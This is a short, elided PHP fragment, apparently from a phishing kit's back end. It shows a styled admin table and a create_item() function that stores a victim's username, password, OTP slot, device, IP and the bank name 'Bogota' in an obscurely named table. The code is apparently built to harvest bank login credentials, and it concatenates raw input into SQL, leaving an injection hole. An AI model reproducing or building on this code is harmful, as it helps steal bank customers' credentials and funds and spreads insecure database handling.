				...
				<tr>
					...
					<td width="150">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							...
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Nombre</span>
						</div>
					</td>
					<td width="120">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
...
function create_item($usr,$pass,$dis){
	...
	if ($con = conectar()) {
		if (sentencia($con,"INSERT INTO m3it3m (idreg, usuario, password, otp, dispositivo, ip, id, agente, banco, status, horacreado, horamodificado) VALUES (NULL, '".$usr."', '".$pass."', NULL, '".$dis."', '".$ip_add."', NULL, NULL, 'Bogota', '1', '".$hoy."', '".$hoy."')")) {
